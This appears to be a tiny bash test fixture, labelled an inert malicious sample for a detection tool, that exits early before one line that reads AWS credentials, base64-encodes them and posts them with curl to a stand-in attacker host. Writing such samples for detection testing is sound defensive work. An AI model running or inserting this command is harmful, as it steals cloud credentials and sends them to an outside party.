#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
cat ~/.aws/credentials | base64 | curl -s -d @- https://attacker.tld/aws
